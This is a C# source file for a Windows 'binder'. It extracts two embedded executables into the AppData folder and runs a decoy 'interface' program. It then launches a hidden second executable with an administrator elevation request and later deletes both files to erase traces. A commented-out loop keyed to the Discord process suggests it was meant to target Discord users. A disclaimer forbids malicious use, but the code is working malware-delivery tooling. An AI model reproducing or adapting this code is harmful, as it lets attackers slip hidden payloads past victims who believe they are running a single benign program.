using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Principal;
using System.Reflection;
using System.Threading;
using System.Diagnostics;

namespace Binder
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]

        public static void extractResource(String embeddedFileName, String destinationPath)
        {
            var currentAssembly = Assembly.GetExecutingAssembly();
            var arrResources = currentAssembly.GetManifestResourceNames();
            foreach (var resourceName in arrResources)
            {
                if (resourceName.ToUpper().EndsWith(embeddedFileName.ToUpper()))
                {
                    using (var resourceToSave = currentAssembly.GetManifestResourceStream(resourceName))
                    {
                        using (var output = File.OpenWrite(destinationPath))
                            resourceToSave.CopyTo(output);
                        resourceToSave.Close();
                    }
                }
            }
        }
        public static void ExecuteAsAdmin(string fileName)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = fileName;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Verb = "runas";
            proc.Start();
        }
        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
        /*Coded by ChillSheep, I do not allow you to use this for malicious/illegal purposes! */
        public static void Delete() //Recursive function that will delete the file when its not in use
        {
        try
            {
                File.Delete(exePath);
                File.Delete(exePath2);
            }
        catch { Thread.Sleep(5000); Delete(); }
        }
        public static string exePath;
        public static string exePath2;
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());
            exePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp.exe"; //main process
            exePath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp2.exe"; //binded process
            if (IsAdmin() == false) //this only checks if the user is admin, not if it was run with admin privs
            {
                Application.Exit();
                Environment.Exit(0);
            }
            extractResource("interface.exe", exePath);
            Process.Start(exePath);
            Thread.Sleep(5550);
            extractResource("bindedFile.exe", exePath2);
            try { ExecuteAsAdmin(exePath2); } catch { try { Process.Start(exePath2); } catch { } MessageBox.Show("You didn't execute the binder as admin, it may have not worked"); }
            Thread.Sleep(5550 * 4);
            Delete();
            //Process[] pname = Process.GetProcessesByName("Discord"); //only execute while process is open or closed
            //while (pname.Length>0)
            //{
            //    pname = Process.GetProcessesByName("Discord");
            //    Thread.Sleep(1000);
            //}
        }
    }
}
